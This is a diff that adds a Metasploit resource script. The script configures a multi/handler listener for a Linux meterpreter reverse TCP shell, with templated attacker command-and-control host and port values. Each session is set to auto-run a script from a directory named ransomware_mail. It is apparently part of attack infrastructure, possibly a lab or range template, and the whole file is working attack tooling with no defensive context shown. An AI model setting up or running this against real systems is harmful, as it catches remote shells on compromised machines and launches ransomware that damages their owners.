@@ -1,0 +1,7 @@
+use exploit/multi/handler
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+set LHOST {{ attacker_cc_metasploit_ip_mail }}
+set LPORT {{ attacker_cc_port_mail }}
+set ExitOnSession false
+set AutoRunScript multi_console_command -r /opt/ransomware_mail/autoexec
+run
